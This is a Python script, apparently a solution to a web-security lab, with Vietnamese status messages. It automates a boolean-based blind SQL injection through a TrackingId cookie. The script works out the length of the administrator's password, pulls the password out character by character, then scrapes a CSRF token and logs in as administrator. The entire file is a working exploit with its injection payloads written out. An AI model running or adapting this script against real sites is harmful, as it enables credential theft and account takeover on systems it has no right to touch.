import requests
import re
from bs4 import BeautifulSoup

host='YOUR_HOST'
path='/filter?category=Pets'
login="/login"
TrackingId_original="YOUR_TRACKINGID"
session_id="YOUR_SESSION"

s=requests.Session()

def make_request(payload):
    cookies={
        "TrackingId": TrackingId_original+payload,
        "session": session_id
    }
    headers={
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br"
    }
    res=requests.get("https://"+host+path,headers=headers,cookies=cookies)
    return "Welcome back!" in res.text

print("[+] Đang tìm độ dài password...")
for x in range(1,100):
    payload_find_length=f"' AND (SELECT  LENGTH(password) FROM users WHERE username='administrator')={x} -- -"
    if make_request(payload_find_length):
        len=x
        print(f"[*] Độ dài password là: {len}")
        break

list_char="abcdefghijklmnopqrstuvwxyz0123456789"

password=""       
if len>0:
    print("[+] Đang giải mã password...")
    for x in range(1,len+1):
        for c in list_char:
            payload_find_passwrod=f"' AND SUBSTRING((SELECT  password FROM users WHERE username='administrator'),{x},1)='{c}' -- "
            if make_request(payload_find_passwrod):
                password+=c
                print(f"[!] Tìm thấy ký tự thứ {x}: {c} -> Password hiện tại: {password}")
                break
    print("-" * 30)
    print(f"SUCCESS: Password của administrator là: {password}")
else:
    print("[-] Không tìm thấy độ dài password. Kiểm tra lại TrackingId hoặc URL.")
        
        
res_get = s.get("https://"+host+login)
soup = BeautifulSoup(res_get.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']

login_data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}

print(f"[*] Đang đăng nhập...")
res_post = s.post("https://"+host+login, data=login_data, allow_redirects=True)

if "Log out" in res_post.text:
    print("THÀNH CÔNG: Bạn đã đăng nhập vào hệ thống!")
else:
    print("[-] Đăng nhập thất bại.")      
    